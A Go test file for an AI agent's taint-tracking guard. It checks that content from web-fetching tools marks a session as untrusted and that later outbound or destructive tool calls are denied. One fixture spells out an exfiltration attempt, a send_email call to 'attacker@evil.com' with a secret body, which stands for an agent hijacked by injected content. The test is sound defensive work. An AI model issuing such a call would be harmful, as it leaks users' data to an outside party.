package ifc

import (
	"context"
	"testing"
	"time"

	"github.com/anthony-chaudhary/fak/internal/abi"
)

func TestLedgerProvenanceTracking(t *testing.T) {
	led := NewLedgerCap(2)

	// Clean/unseen trace
	unseenProv := led.Provenance("unseen")
	if unseenProv.Level != abi.TaintTrusted || unseenProv.SourceTool != "" {
		t.Fatalf("unseen trace provenance = %+v, want Level=TaintTrusted and empty tool", unseenProv)
	}

	// Raise with provenance
	now := time.Now().UnixNano()
	p1 := TaintProvenance{
		Level:         abi.TaintTainted,
		SourceTool:    "read_webpage",
		SourceCallSeq: 42,
		SourceDigest:  "sha256:abcd",
		TaintedAt:     now,
	}
	led.RaiseWithProvenance("t1", abi.TaintTainted, p1)

	gotP1 := led.Provenance("t1")
	if gotP1.Level != abi.TaintTainted || gotP1.SourceTool != "read_webpage" ||
		gotP1.SourceCallSeq != 42 || gotP1.SourceDigest != "sha256:abcd" || gotP1.TaintedAt != now {
		t.Fatalf("t1 provenance = %+v, want %+v", gotP1, p1)
	}

	// Lower or equal rank does not overwrite higher provenance
	pLower := TaintProvenance{
		Level:      abi.TaintTrusted,
		SourceTool: "safe_tool",
	}
	led.RaiseWithProvenance("t1", abi.TaintTrusted, pLower)
	if got := led.Provenance("t1"); got.SourceTool != "read_webpage" {
		t.Fatalf("lower rank should not overwrite provenance: got tool %q", got.SourceTool)
	}

	// Higher rank (Quarantined) overwrites
	pQuar := TaintProvenance{
		Level:      abi.TaintQuarantined,
		SourceTool: "poison_probe",
	}
	led.RaiseWithProvenance("t1", abi.TaintQuarantined, pQuar)
	if got := led.Provenance("t1"); got.Level != abi.TaintQuarantined || got.SourceTool != "poison_probe" {
		t.Fatalf("higher rank should update provenance: got %+v", got)
	}

	// Bounded capacity eviction evicts provenance along with mark
	led.Raise("t2", abi.TaintTainted)
	led.Raise("t3", abi.TaintTainted) // evicts t1
	if got := led.Provenance("t1"); got.Level != abi.TaintTrusted || got.SourceTool != "" {
		t.Fatalf("evicted trace should return clean provenance, got %+v", got)
	}

	// Reset clears provenance
	led.Reset("t2")
	if got := led.Provenance("t2"); got.Level != abi.TaintTrusted || got.SourceTool != "" {
		t.Fatalf("reset trace should return clean provenance, got %+v", got)
	}
}

func TestStampGateCapturesProvenance(t *testing.T) {
	ctx := context.Background()
	led := NewLedger()
	stamp := NewStampGate(led, Policy{})

	call := &abi.ToolCall{
		Tool:    "read_webpage",
		TraceID: "trace-audit-1",
		SeqNo:   7,
	}
	res := &abi.Result{
		Payload: abi.Ref{
			Kind:   abi.RefInline,
			Inline: []byte("untrusted external content"),
			Digest: "sha256:webpage_payload",
		},
	}

	stamp.Admit(ctx, call, res)

	prov := led.Provenance("trace-audit-1")
	if prov.Level != abi.TaintTainted {
		t.Fatalf("level = %v, want TaintTainted", prov.Level)
	}
	if prov.SourceTool != "read_webpage" {
		t.Fatalf("SourceTool = %q, want read_webpage", prov.SourceTool)
	}
	if prov.SourceCallSeq != 7 {
		t.Fatalf("SourceCallSeq = %d, want 7", prov.SourceCallSeq)
	}
	if prov.SourceDigest != "sha256:webpage_payload" {
		t.Fatalf("SourceDigest = %q, want sha256:webpage_payload", prov.SourceDigest)
	}
	if prov.TaintedAt <= 0 {
		t.Fatalf("TaintedAt = %d, want > 0", prov.TaintedAt)
	}
}

func TestSinkGateMetaAndFixOnTrustViolation(t *testing.T) {
	ctx := context.Background()
	led := NewLedger()
	stamp := NewStampGate(led, Policy{})
	sink := NewSinkGate(led, Policy{})

	// 1. Taint session with StampGate
	stamp.Admit(ctx, &abi.ToolCall{
		Tool:    "fetch_url",
		TraceID: "trace-audit-2",
		SeqNo:   10,
	}, &abi.Result{
		Payload: abi.Ref{Kind: abi.RefInline, Inline: []byte("payload"), Digest: "sha256:fetch1"},
	})

	// 2. Call sensitive sink with external destination in arguments
	egressCall := &abi.ToolCall{
		Tool:    "send_email",
		TraceID: "trace-audit-2",
		Args:    abi.Ref{Kind: abi.RefInline, Inline: []byte(`{"to":"attacker@evil.com","body":"secret"}`)},
	}

	v := sink.Adjudicate(ctx, egressCall)
	if v.Kind != abi.VerdictDeny {
		t.Fatalf("want VerdictDeny, got %v", v.Kind)
	}
	if v.Reason != abi.ReasonTrustViolation {
		t.Fatalf("want ReasonTrustViolation, got %v", v.Reason)
	}
	if v.Meta["subsystem"] != "ifc-sink" {
		t.Fatalf("subsystem = %q, want ifc-sink", v.Meta["subsystem"])
	}
	if v.Meta["deny_rule"] != "ifc_taint_egress" {
		t.Fatalf("deny_rule = %q, want ifc_taint_egress", v.Meta["deny_rule"])
	}
	if v.Meta["taint_source_tool"] != "fetch_url" {
		t.Fatalf("taint_source_tool = %q, want fetch_url", v.Meta["taint_source_tool"])
	}
	if v.Meta["offending_arg"] != "to" {
		t.Fatalf("offending_arg = %q, want to", v.Meta["offending_arg"])
	}
	wantFix := "IFC egress block: parameter 'to' contains external destination; strip off-box destination keys from send_email or authorize tool in policy"
	if v.Meta["fix"] != wantFix {
		t.Fatalf("fix = %q, want %q", v.Meta["fix"], wantFix)
	}

	// 3. Call sensitive sink WITHOUT external destination in arguments (e.g. destructive sink)
	destructCall := &abi.ToolCall{
		Tool:    "delete_reservation",
		TraceID: "trace-audit-2",
		Args:    abi.Ref{Kind: abi.RefInline, Inline: []byte(`{"id":"res-999"}`)},
	}

	vDestruct := sink.Adjudicate(ctx, destructCall)
	if vDestruct.Kind != abi.VerdictDeny {
		t.Fatalf("want VerdictDeny, got %v", vDestruct.Kind)
	}
	if vDestruct.Meta["offending_arg"] != "" {
		t.Fatalf("offending_arg should be empty, got %q", vDestruct.Meta["offending_arg"])
	}
	if vDestruct.Meta["taint_source_tool"] != "fetch_url" {
		t.Fatalf("taint_source_tool = %q, want fetch_url", vDestruct.Meta["taint_source_tool"])
	}
	wantDestructFix := "IFC DESTRUCTIVE block: session carries untrusted data; avoid outbound egress or authorize tool in policy"
	if vDestruct.Meta["fix"] != wantDestructFix {
		t.Fatalf("fix = %q, want %q", vDestruct.Meta["fix"], wantDestructFix)
	}
}

func TestFindExternalDestinationDeterministic(t *testing.T) {
	args := map[string]any{
		"path":     "/var/log/app.log",
		"endpoint": "https://api.remote.com/v1",
		"to":       "user@example.com",
	}
	k, val, ok := findExternalDestination(args)
	if !ok {
		t.Fatalf("expected to find external destination")
	}
	// "endpoint" precedes "to" alphabetically
	if k != "endpoint" || val != "https://api.remote.com/v1" {
		t.Fatalf("expected deterministic key 'endpoint', got %q (%q)", k, val)
	}
}

func TestLedgerProvenanceBaseTraceDeterministicDescending(t *testing.T) {
	led := NewLedgerCap(10)

	base := "sess-abc"
	led.RaiseWithProvenance(TurnTrace(base, 1), abi.TaintTainted, TaintProvenance{
		Level:      abi.TaintTainted,
		SourceTool: "tool_turn1",
	})
	led.RaiseWithProvenance(TurnTrace(base, 3), abi.TaintTainted, TaintProvenance{
		Level:      abi.TaintTainted,
		SourceTool: "tool_turn3",
	})
	led.RaiseWithProvenance(TurnTrace(base, 2), abi.TaintTainted, TaintProvenance{
		Level:      abi.TaintTainted,
		SourceTool: "tool_turn2",
	})

	// Provenance for base should deterministically pick the latest turn (turn 3)
	for i := 0; i < 20; i++ {
		p := led.Provenance(base)
		if p.SourceTool != "tool_turn3" {
			t.Fatalf("iteration %d: expected latest turn tool_turn3, got %q", i, p.SourceTool)
		}
	}
}

